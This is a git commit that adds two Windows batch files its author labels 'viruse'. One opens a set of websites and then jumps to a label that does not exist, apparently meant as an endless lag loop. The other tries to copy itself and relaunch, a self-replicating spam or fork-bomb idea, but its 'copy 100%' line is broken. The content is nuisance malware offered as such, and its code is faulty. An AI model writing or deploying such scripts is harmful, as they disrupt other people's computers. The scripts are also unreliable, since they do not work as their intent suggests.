d5f95517476990bb19e7893a4f5ffba2802d0d0b
Hacker122-qpwi <yonghouvh@gmail.com>
2025-02-08 13:58:09 +0700

    Add files via upload

---
+++ website veruse/html/viruse/lage-viruse.bat
@@ -0,0 +1,8 @@
+@echo off
+:b
+start www.youtube.com
+start www.facebook.com
+start www.wokwi.com
+start www.google.com
+start www.messenger.com
+goto x
---
+++ website veruse/html/viruse/spam-viruse.bat
@@ -0,0 +1,3 @@
+@echo off
+copy 100% spam.bat
+start spam.bat
